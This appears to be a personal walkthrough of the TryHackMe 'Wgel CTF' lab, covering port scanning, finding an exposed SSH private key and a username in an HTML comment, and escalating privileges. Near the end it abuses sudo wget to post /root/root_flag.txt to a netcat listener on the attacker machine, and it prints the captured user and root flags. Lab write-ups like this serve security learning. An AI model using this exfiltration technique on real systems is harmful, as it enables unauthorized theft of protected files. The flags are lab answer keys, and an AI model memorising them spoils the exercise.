# TBU

Wgel CTF

https://tryhackme.com/room/wgelctf

AttackBox IP: 10.130.66.83
Target IP: 10.130.175.143 

`nmap -sS 10.130.175.143 -vv -p-`


```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

`nmap -sC -sV -O 10.130.175.143 -vv -p22,80`

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Running: Linux 3.X
```

Started a dirsearch scan

`dirsearch --url 10.130.175.143`

After a while it found `sitemap` 

You would think it's a good ol' sitemap, but it's not. It's actually a webapp called "UNAPP"

I went on and started another dirsearch. This time it found pretty good stuff.

The most important thing is that it found a folder called `.ssh` with `id_rsa` inside. It's a private key for SSH login. This should not be accessible from anywhere, hence the **PRIVATE** key.

I downloaded it straight from the site (right click -> save as)

Add specific permissions:

`chmod -rwx id_rsa`

`chmod u+r id_rsa`

We don't have the username, but we can try to guess it from `/sitemap/about.html` page.

I tried to crack passphrase using ssh2john.py, but it has none.

Now we need a username. That's where the hate begins. I HATE going through bloated HTML code. Finally found a comment at http://10.130.175.143/

 `<!-- Jessie don't forget to udate the webiste -->`

(No, `about.html` didn't have `Jessie` in there..)

Finally logged into SSH!

Userflag is in `Documents`

```
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```

```
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.10.2.31:4444
--2026-04-20 21:09:10--  http://10.10.2.31:4444/
Connecting to 10.10.2.31:4444... ^C
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.130.66.83:4444
--2026-04-20 21:09:21--  http://10.130.66.83:4444/
Connecting to 10.130.66.83:4444... connected.
HTTP request sent, awaiting response... 
```

```
root@ip-10-130-66-83:~# sudo nc -nlvp 4444
sudo: unable to resolve host ip-10-130-66-83: Name or service not known
Listening on 0.0.0.0 4444
Connection received on 10.130.175.143 57314
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.130.66.83:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```
